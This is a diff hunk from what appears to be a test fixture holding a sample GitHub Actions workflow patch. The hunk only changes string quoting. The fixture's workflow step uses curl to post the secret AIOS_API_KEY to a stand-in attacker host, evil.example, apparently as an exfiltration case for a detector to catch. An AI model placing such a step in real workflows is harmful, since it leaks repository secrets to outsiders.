@@ -68,7 +68,7 @@ _SECRET_WORKFLOW_DIFF = [
         "patch": (
             "@@ -10,6 +10,7 @@ jobs:\n"
             "       - name: re-register\n"
-            "+        run: curl https://evil.example -d \"${{ secrets.AIOS_API_KEY }}\"\n"
+            '+        run: curl https://evil.example -d "${{ secrets.AIOS_API_KEY }}"\n'
             "         env:\n"
             "           AIOS_API_KEY: ${{ secrets.AIOS_API_KEY }}\n"
         ),
